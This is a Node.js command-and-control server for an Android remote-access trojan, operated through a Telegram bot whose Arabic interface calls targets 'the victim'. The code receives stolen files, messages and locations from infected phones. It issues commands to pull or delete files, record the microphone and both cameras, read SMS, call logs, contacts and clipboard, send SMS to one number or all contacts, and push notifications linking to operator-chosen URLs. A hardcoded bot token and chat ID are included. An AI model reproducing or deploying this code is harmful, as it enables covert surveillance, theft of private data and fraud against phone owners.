const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8819231510:AAEML0e8ZKS7xf0OWlhyzQoYWuk88UY1bwQ'
const id = '8242461280'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        const name = req.file.originalname
        appBot.sendDocument(id, req.file.buffer, {
                caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
                parse_mode: "HTML"
            },
            {
                filename: name,
                contentType: 'application/txt',
            })
    } catch (e) {}
    res.send('')
})
app.post("/uploadText", (req, res) => {
    try {
        appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
    } catch (e) {}
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    try {
        appBot.sendLocation(id, req.body['lat'], req.body['lon'])
        appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
    } catch (e) {}
    res.send('')
})

function safeSend(ws, data) {
    try {
        if (ws.readyState === 1) ws.send(data)
    } catch (e) {}
}

function sendToUuid(uuid, data) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) safeSend(ws, data)
    });
}

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    ws.isAlive = true
    ws.on('pong', () => { ws.isAlive = true })

    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    try {
        appBot.sendMessage(id,
            `°• جهاز جديد متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
    } catch (e) {}

    ws.on('close', function () {
        try {
            appBot.sendMessage(id,
                `°• لا يوجد جهاز متصل\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• نظام الاندرويد : <b>${version}</b>\n` +
                `• سطوح الشاشة : <b>${brightness}</b>\n` +
                `• مزود : <b>${provider}</b>`,
                {parse_mode: "HTML"}
            )
        } catch (e) {}
        appClients.delete(ws.uuid)
    })
    ws.on('error', function () {
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                {reply_markup: {force_reply: true}}
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            sendToUuid(currentUuid, `send_message:${currentNumber}/${message.text}`)
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text
            sendToUuid(currentUuid, `send_message_to_all:${message_to_all}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text
            sendToUuid(currentUuid, `file:${path}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            const path = message.text
            sendToUuid(currentUuid, `delete_file:${path}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text
            sendToUuid(currentUuid, `microphone:${duration}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text
            sendToUuid(currentUuid, `rec_camera_main:${duration}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text
            sendToUuid(currentUuid, `rec_camera_selfie:${duration}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text
            sendToUuid(currentUuid, `toast:${toastMessage}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
                '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
                {reply_markup: {force_reply: true}}
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text
            sendToUuid(currentUuid, `show_notification:${currentTitle}/${link}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text
            sendToUuid(currentUuid, `play_audio:${audioLink}`)
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK\n\n' +
                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n' +
                '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر\n\n' +
                '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر\n\n' +
                '• إذا علقت في مكان ما في الروبوت ، أرسل /start  الأمر ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            ).catch(() => {})
        }
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                ).catch(() => {})
            } else {
                let text = '°• قائمة الاجهزة المتصلة :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                        `• البطارية : <b>${value.battery}</b>\n` +
                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
                        `• مزود : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"}).catch(() => {})
            }
        }
        if (message.text == 'تنفيذ الامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                ).catch(() => {})
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key,
                        style: 'primary'
                    }])
                })
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                }).catch(() => {})
            }
        }
    } else {
        appBot.sendMessage(id, '°• طلب الاذن مرفوض').catch(() => {})
    }
})

appBot.on("callback_query", (callbackQuery) => {
    try { appBot.answerCallbackQuery(callbackQuery.id) } catch (e) {}

    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    if (commend == 'device') {
        const devInfo = appClients.get(uuid)
        if (!devInfo) {
            appBot.sendMessage(id, '°• الجهاز غير متصل حالياً').catch(() => {})
            return
        }
        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${devInfo.model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'التطبيقات', callback_data: `apps:${uuid}`, style: 'success'},
                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`, style: 'success'}
                    ],
                    [
                        {text: 'الحصول علئ الملفات', callback_data: `file:${uuid}`, style: 'primary'},
                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`, style: 'danger'}
                    ],
                    [
                        {text: 'الحافظة', callback_data: `clipboard:${uuid}`, style: 'primary'},
                        {text: 'المكرفون', callback_data: `microphone:${uuid}`, style: 'danger'},
                    ],
                    [
                        {text: 'الكاميرا الامامي', callback_data: `camera_main:${uuid}`, style: 'danger'},
                        {text: 'الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`, style: 'danger'}
                    ],
                    [
                        {text: 'الموقع', callback_data: `location:${uuid}`, style: 'primary'},
                        {text: 'نخب', callback_data: `toast:${uuid}`, style: 'primary'}
                    ],
                    [
                        {text: 'المكالمات', callback_data: `calls:${uuid}`, style: 'danger'},
                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`, style: 'success'}
                    ],
                    [
                        {text: 'يهتز', callback_data: `vibrate:${uuid}`, style: 'primary'},
                        {text: 'اظهار الاخطار', callback_data: `show_notification:${uuid}`, style: 'primary'}
                    ],
                    [
                        {text: 'الرسايل', callback_data: `messages:${uuid}`, style: 'danger'},
                        {text: 'ارسال رسالة', callback_data: `send_message:${uuid}`, style: 'danger'}
                    ],
                    [
                        {text: 'تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`, style: 'primary'},
                        {text: 'ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`, style: 'primary'},
                    ],
                    [
                        {
                            text: 'ارسال رسالة الئ جميع جهة اتصال',
                            callback_data: `send_message_to_all:${uuid}`,
                            style: 'danger'
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        }).catch(() => {})
    }
    if (commend == 'calls') {
        sendToUuid(uuid, 'calls');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'contacts') {
        sendToUuid(uuid, 'contacts');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'messages') {
        sendToUuid(uuid, 'messages');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'apps') {
        sendToUuid(uuid, 'apps');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'device_info') {
        sendToUuid(uuid, 'device_info');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'clipboard') {
        sendToUuid(uuid, 'clipboard');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'camera_main') {
        sendToUuid(uuid, 'camera_main');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'camera_selfie') {
        sendToUuid(uuid, 'camera_selfie');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'location') {
        sendToUuid(uuid, 'location');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'vibrate') {
        sendToUuid(uuid, 'vibrate');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'stop_audio') {
        sendToUuid(uuid, 'stop_audio');
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(() => {})
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
            {reply_markup: {force_reply: true}}).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        ).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(() => {})
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id).catch(() => {})
        appBot.sendMessage(id,
            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        ).catch(() => {})
        currentUuid = uuid
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        if (ws.isAlive === false) {
            appClients.delete(ws.uuid)
            try { ws.terminate() } catch (e) {}
            return
        }
        ws.isAlive = false
        try { ws.ping() } catch (e) {}
    });
    try {
        axios.get(address).catch(() => {})
    } catch (e) {}
}, 5000)

appServer.listen(process.env.PORT || 8999);